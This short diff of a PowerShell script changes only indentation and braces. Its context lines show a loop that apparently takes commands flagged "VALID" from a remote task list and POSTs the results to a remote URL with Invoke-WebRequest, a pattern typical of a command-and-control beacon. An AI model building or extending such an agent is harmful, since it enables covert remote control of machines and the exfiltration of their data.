@@ -25,7 +25,6 @@ for (;;){
         $flag = $task[0]
 
         if ($flag -eq "VALID"){
-
             $command = $task[1]
             $args    = $task[2..$task.Length]
 
@@ -41,8 +40,7 @@ for (;;){
 
                 Invoke-WebRequest -UseBasicParsing -Uri $resultl -Body $data -Method 'POST'
             }
-	    }
-
+	}
     sleep $n
     }
 }
